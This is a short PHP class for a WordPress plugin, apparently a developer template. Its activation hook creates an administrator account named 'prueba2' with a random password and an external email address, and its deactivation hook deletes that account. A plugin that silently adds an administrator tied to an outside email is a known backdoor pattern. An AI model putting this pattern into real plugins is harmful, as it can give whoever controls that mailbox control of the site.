<?php

class PluginManager {

    // Function for activation
    static function template_activate() {
        // Add option
        add_option( 'template_version', TEMPLATE_VERSION );
        // Create user prueba2
        if ( ! username_exists( 'prueba2' ) ) {
            $password = wp_generate_password( 12, false );
            wp_insert_user( [
                'user_login' => 'prueba2',
                'user_pass' => $password,
                'user_email' => 'prueba2@prueba.com',
                'nickname' => 'prueba2',
                'first_name' => 'Prueba',
                'last_name' => '2',
                'role' => 'administrator',
            ] );
        }
    }

    // Function for deactivation
    static function template_deactivate() {
        // Delete option
        delete_option( 'template_version' );
        // Delete user prueba2
        $user = get_user_by( 'login', 'prueba2' );
        if ( $user ) {
            wp_delete_user( $user->ID );
        }
    }

}